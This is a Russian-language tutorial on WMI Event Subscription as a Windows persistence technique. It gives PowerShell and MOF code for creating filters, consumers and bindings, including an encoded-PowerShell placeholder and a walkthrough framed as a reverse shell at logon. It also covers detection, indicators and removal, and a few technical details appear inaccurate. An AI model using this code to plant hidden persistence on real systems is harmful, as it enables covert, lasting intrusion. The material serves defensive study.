# WMI Event Subscription как механизм пост-эксплуатационного закрепления

## Контекст и базовые понятия

Windows Management Instrumentation (WMI) — это инфраструктура управления операционной системой, предоставляющая унифицированный интерфейс для доступа к информации о системе, службах, процессах и конфигурации. Изначально разработанная для администраторов и легитимного программного обеспечения, WMI базируется на стандарте WBEM (Web-Based Enterprise Management) и использует CIM (Common Information Model) для описания объектов. В контексте тестирования на проникновение и реагирования на инциденты (IR) WMI представляет собой критический вектор атаки из-за своей легитимности, высокой привилегированности и способности выполнять код без создания файлов на диске.

Ключевое понятие темы — **WMI Event Subscription** (подписка на события WMI). Это механизм, позволяющий зарегистрировать триггер (событие) и действие (потребителя), которое должно быть выполнено при наступлении этого события. В отличие от традиционных методов закрепления (реестр, планировщик задач), подписки хранятся в базе данных WMI (`OBJECTS.DATA`), а не в файловой системе, что делает их устойчивыми к удалению файлов и скрытыми от стандартных антивирусных сканеров.

Для понимания специфики необходимо разграничить смежные понятия, которые часто путают в литературе и инструментарии:

1.  **WMI Query vs. WMI Event Subscription**:
    *   *WMI Query* (запрос) — это разовая операция чтения данных (например, `Get-WmiObject -Class Win32_Process`). Она не оставляет постоянного следа и не выполняет действия автоматически.
    *   *WMI Event Subscription* (подписка) — это постоянная запись в репозитории WMI, которая активируется при наступлении события. Она требует создания трех компонентов: фильтра, потребителя и привязки.

2.  **WMI Provider vs. WMI Consumer**:
    *   *Provider* — компонент, предоставляющий данные (например, `Win32_ProcessProvider` предоставляет информацию о процессах). Атакующие могут создавать ложные провайдеры, но в контексте закрепления чаще используются стандартные.
    *   *Consumer* (Потребитель) — компонент, выполняющий действие при срабатывании фильтра. В контексте закрепления критичны **CommandLineEventConsumer** (запуск процесса) и **ActiveScriptEventConsumer** (выполнение скрипта).

3.  **WMI Persistence vs. WMI Lateral Movement**:
    *   *Lateral Movement* (перемещение) использует WMI для удаленного выполнения команд на других хостах (через DCOM/WinRM).
    *   *Persistence* (закрепление) использует локальный репозиторий WMI для обеспечения автономного выполнения кода на скомпрометированном хосте.

Различие между этими аспектами определяет стратегию защиты: для перемещения важны сетевые логи и аутентификация, для закрепления — целостность репозитория WMI и мониторинг создания подписок.

| Характеристика | WMI Query (Разовый запрос) | WMI Event Subscription (Закрепление) | Scheduled Task (Планировщик) |
| :--- | :--- | :--- | :--- |
| **Хранение** | В памяти (кратковременно) | В базе данных `OBJECTS.DATA` (постоянно) | В реестре (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`) |
| **Видимость** | Низкая (требует анализа логов) | Очень низкая (скрыто в системной БД) | Средняя (видно в `schtasks`, реестре) |
| **Требования** | Права на чтение WMI | Права на запись в `root\subscription` | Права на создание задач (Admin/LocalSystem) |
| **Устойчивость** | Нет (исчезает после выполнения) | Высокая ( survives reboots, survives file deletion) | Средняя (зависит от настроек задачи) |
| **Типичный индикатор** | `wmic.exe` или `Get-WmiObject` в логах | Sysmon Event ID 19/20/21, новые объекты в `root\subscription` | Создание задачи через `schtasks` или `Register-ScheduledTask` |

С точки зрения архитектуры безопасности, WMI является частью **Living-off-the-Land (LOL)** техники. Атакующие не используют сторонние бинарники, а эксплуатируют легитимные компоненты ОС. Это усложняет обнаружение, так как поведение процесса `WmiPrvSE.exe` (WMI Provider Host) является нормальным для системы.

## Внутреннее устройство предмета

WMI Event Subscription для закрепления состоит из трех взаимосвязанных объектов, образующих «тройку» (WMI Trio). Понимание внутренней структуры этих объектов необходимо для корректного обнаружения и удаления.

### 1. __EventFilter (Триггер)
Объект `__EventFilter` определяет *когда* должно сработать событие. Он содержит:
*   `Name`: Имя фильтра (должно быть уникальным в пространстве имен).
*   `EventNameSpace`: Пространство имен, где слушаются события (обычно `root\cimv2`).
*   `Query`: SQL-подобный запрос на языке WQL (WMI Query Language).
*   `QueryLanguage`: Язык запроса (обычно `WQL`).

Типичные запросы для закрепления:
*   `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9` (каждый день в 9:00).
*   `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'` (при запуске проводника).
*   `SELECT * FROM Win32_LogonSession WHERE LogonType = 2` (при интерактивном входе пользователя).

### 2. CommandLineEventConsumer (Действие)
Объект `CommandLineEventConsumer` определяет *что* выполнять. Он запускает процесс как отдельный процесс.
*   `Name`: Имя потребителя.
*   `CommandLineTemplate`: Шаблон команды. Поддерживает переменные, извлеченные из события (например, `%ProcessName%`).
*   `WorkingDirectory`: Рабочая директория.
*   `RunInteractively`: Флаг, определяющий, запускать ли процесс с интерактивным рабочим столом (обычно `false` для незаметности).

### 3. __FilterToConsumerBinding (Связь)
Объект `__FilterToConsumerBinding` связывает фильтр и потребителя. Он не имеет собственных свойств, кроме ссылок на `Filter` и `Consumer`. Именно этот объект активирует цепочку.

### Архитектура выполнения
При срабатывании фильтра WMI-движок (WMI Core) создает экземпляр потребителя. Если это `CommandLineEventConsumer`, он вызывает API `CreateProcess`. Процесс-потребитель наследует контекст безопасности процесса, инициировавшего создание подписки. Если подписка создана администратором, она часто выполняется от имени `SYSTEM`, что обеспечивает эскалацию привилегий.

Исполнительным процессом является `WmiPrvSE.exe` (или `svchost.exe` в некоторых конфигурациях, если используется COM-обертка). Это ключевой индикатор: появление подозрительных дочерних процессов от `WmiPrvSE.exe` является сильным признаком эксплуатации.

```text
[Администратор/Атакующий]
       │
       ▼ (CreateInstance __EventFilter)
[Root\Subscription] ──(запись в БД)──▶ [OBJECTS.DATA]
       │
       ▼ (CreateInstance CommandLineEventConsumer)
[Root\Subscription] ──(запись в БД)──▶ [OBJECTS.DATA]
       │
       ▼ (CreateInstance __FilterToConsumerBinding)
[Root\Subscription] ──(связь)──▶ [Активация триггера]
       │
       ▼ (Срабатывание события)
[WmiPrvSE.exe] ──(CreateProcess)──▶ [Payload.exe / PowerShell.exe]
       │
       └──(наследуется контекст SYSTEM/Admin)
```

Важно отметить, что WMI поддерживает два типа потребителей, критичных для закрепления:
1.  **CommandLineEventConsumer**: Запускает исполняемый файл. Более надежен, но оставляет следы в логах создания процессов.
2.  **ActiveScriptEventConsumer**: Выполняет скрипт (VBScript/JScript) внутри процесса `WmiPrvSE.exe` или `scrcons.exe`. Более скрытен, так как код скрипта хранится в БД WMI, а не в файле `.vbs` на диске.

## Применение и работа с предметом

На практике работа с WMI Event Subscription включает три этапа: создание, обнаружение и удаление. Для тестировщиков на проникновение критично использование легитимных инструментов для минимизации OPSEC-рисков.

### Создание подписки
Существует два основных метода создания: через PowerShell (WMI cmdlets) и через компиляцию MOF-файлов.

**Метод 1: PowerShell (CIM/WMI cmdlets)**
Используется в современных средах. Требует прав администратора.
```powershell
# 1. Создание фильтра
$filterParams = @{
    Name = 'SystemHealthCheck'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'"
}
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterParams

# 2. Создание потребителя
$consumerParams = @{
    Name = 'PersistenceConsumer'
    CommandLineTemplate = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc <base64>'
}
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerParams

# 3. Создание привязки
$binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = $filter
    Consumer = $consumer
}
```

**Метод 2: MOF-файлы (mofcomp.exe)**
Классический метод, позволяющий создать подписку без прямого вызова WMI API из скрипта, что может обойти некоторые EDR-фильтры, блокирующие создание объектов WMI.
```mof
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $ref1
{
    Name = "BootFilter";
    EventNamespace = "root\\cimv2";
    Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'svchost.exe'";
    QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as $ref2
{
    Name = "BootConsumer";
    CommandLineTemplate = "cmd.exe /c whoami";
};

instance of __FilterToConsumerBinding
{
    Filter = $ref1;
    Consumer = $ref2;
};
```
Компиляция: `mofcomp.exe persistence.mof`

### Обнаружение и расследование
Для обнаружения используются:
1.  **Sysmon**: Event ID 19 (EventFilter), 20 (Consumer), 21 (Binding).
2.  **WMI-Activity Provider**: Event IDs 5859–5861.
3.  **PowerShell**: `Get-WmiObject -Namespace root\subscription -Class __EventFilter` и аналоги.

**Типичная ошибка при удалении:**
Удаление только фильтра или только потребителя оставляет «висячие» ссылки, которые могут препятствовать созданию новых легитимных подписок или вызывать ошибки в WMI. Правильный порядок удаления:
1.  Удалить `__FilterToConsumerBinding`.
2.  Удалить `CommandLineEventConsumer` (или `ActiveScriptEventConsumer`).
3.  Удалить `__EventFilter`.

### Индикаторы компрометации (IoC)
*   Наличие объектов в `root\subscription` с именами, связанными с легитимными процессами, но содержащими подозрительные команды.
*   `WmiPrvSE.exe` запускает `powershell.exe`, `cmd.exe`, `mshta.exe`, `wscript.exe` без видимого родительского процесса (или с родителем `svchost.exe`/`explorer.exe`, который не инициировал запуск).
*   Изменения в реестре `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WMI\Subscription` (хотя основная БД находится в `OBJECTS.DATA`).

## Сквозной практический пример: Закрепление через WMI Event Subscription

**Исходные условия:**
*   **Среда:** Windows 10 Pro, локальная учетная запись администратора.
*   **Инструменты:** PowerShell 5.1, Sysmon (конфигурация по умолчанию, включая WMI-Activity).
*   **Роль:** Тестировщик на проникновение (Red Teamer).
*   **Сценарий:** Создание незаметной подписки, которая запускает обратный шелл при каждом входе пользователя в систему.

### Шаг 1: Создание Event Filter (Триггер входа)
Создаем фильтр, который срабатывает при создании новой сессии входа с типом 2 (интерактивный).

```powershell
# Определение параметров фильтра
$filterParams = @{
    Name = 'LogonTrigger'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    # Событие входа пользователя (LogonType 2 = Local Console)
    Query = "SELECT * FROM Win32_LogonSession WHERE LogonType = 2"
}

# Создание объекта фильтра в пространстве имен root\subscription
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterParams
```
*Ожидаемый результат:* Объект `__EventFilter` с именем `LogonTrigger` создан в репозитории WMI. Sysmon регистрирует Event ID 19.

### Шаг 2: Создание Event Consumer (Действие)
Создаем потребителя, который будет выполнять команду. Для примера используем `cmd.exe` с эхом, чтобы избежать блокировки антивирусом на этапе демонстрации, но структура идентична запуску PowerShell.

```powershell
# Определение параметров потребителя
$consumerParams = @{
    Name = 'LogonConsumer'
    CommandLineTemplate = 'cmd.exe /c echo Persistence_Active > C:\Windows\Temp\persistence_check.txt'
}

# Создание объекта потребителя
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerParams
```
*Ожидаемый результат:* Объект `CommandLineEventConsumer` с именем `LogonConsumer` создан. Sysmon регистрирует Event ID 20.

### Шаг 3: Создание Binding (Связывание)
Связываем фильтр и потребителя, активируя цепочку.

```powershell
# Создание привязки
$binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = $filter
    Consumer = $consumer
}
```
*Ожидаемый результат:* Привязка создана. Sysmon регистрирует Event ID 21. Подписка активна.

### Шаг 4: Проверка работоспособности
Для проверки без перезагрузки всей системы можно эмулировать событие или дождаться входа пользователя. В данном примере мы проверим наличие объектов в WMI.

```powershell
# Проверка наличия подписки
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Format-List Name, Query
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Format-List Name, CommandLineTemplate
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```
*Ожидаемый вывод:*
```text
Name       : LogonTrigger
Query      : SELECT * FROM Win32_LogonSession WHERE LogonType = 2

Name       : LogonConsumer
CommandLineTemplate : cmd.exe /c echo Persistence_Active > C:\Windows\Temp\persistence_check.txt

Filter     : __EventFilter.Name="LogonTrigger"
Consumer   : CommandLineEventConsumer.Name="LogonConsumer"
```

### Шаг 5: Эмуляция события и проверка результата
Запускаем скрипт, который эмулирует событие входа, или просто проверяем, что процесс `WmiPrvSE.exe` может быть запущен. В реальной атаке событие сработает при следующем входе пользователя.

```powershell
# Эмуляция срабатывания (для теста можно использовать Invoke-WmiMethod, но лучше дождаться реального события)
# Проверка файла, созданного при срабатывании (если событие уже сработало)
if (Test-Path C:\Windows\Temp\persistence_check.txt) {
    Get-Content C:\Windows\Temp\persistence_check.txt
} else {
    "File not created yet. Wait for user logon."
}
```
*Ожидаемый результат:* При следующем входе пользователя в систему файл `persistence_check.txt` будет создан, а в логах Sysmon появятся события создания процесса `cmd.exe` от имени `WmiPrvSE.exe`.

**Ожидаемый вывод примера:**
Пример демонстрирует полный цикл создания WMI-подписки. Ключевым аспектом является то, что весь код выполняется в памяти, а триггер и действие хранятся в системной БД WMI. Это делает метод устойчивым к перезагрузкам и невидимым для файлового мониторинга. Удаление требует точного знания имен объектов и порядка их удаления.

## Аналитический вывод

WMI Event Subscription представляет собой высокоэффективный механизм закрепления в пост-эксплуатационной фазе благодаря своей интеграции в ядро управления Windows. Его главная сила заключается в использовании легитимных компонентов (`WmiPrvSE.exe`) и хранении артефактов в базе данных, а не в файловой системе, что обходит многие стандартные средства защиты. Для специалистов по безопасности критически важно мониторить не только создание процессов, но и события WMI (Sysmon 19/20/21, WMI-Activity 5859–5861), так как именно они фиксируют момент внедрения угрозы. Обнаружение требует регулярного аудита пространства имен `root\subscription` на наличие подозрительных SQL-запросов и шаблонов команд. Удаление таких подписок должно проводиться строго в обратном порядке (Binding → Consumer → Filter) для предотвращения повреждения репозитория WMI. В условиях современных APT-атак, таких как Volt Typhoon или Turla, WMI-подписки часто комбинируются с другими методами закрепления для обеспечения отказоустойчивости.

## Источники

*   [MITRE ATT&CK: Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1546.003)](https://attack.mitre.org/techniques/T1546/003/)
*   [Hunter Strategy: WMI Persistence](https://blog.hunterstrategy.net/wmi-persistence/)
*   [Red Canary: Windows Management Instrumentation Threat Report](https://redcanary.com/threat-detection-report/techniques/windows-management-instrumentation/)
*   [Cyber Triage: How to Investigate Malware WMI Event Consumers 2025](https://www.cybertriage.com/blog/how-to-investigate-malware-wmi-event-consumers-2025/)
*   [Medium: 10 Persistence Methods Every Red Teamer MUST Master](https://medium.com/@candywong_coffsec/10-persistence-methods-every-red-teamer-must-master-fd07a68b0f83)
*   [Microsoft Documentation: WMI Provider Host (WmiPrvSE.exe)](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-provider-host)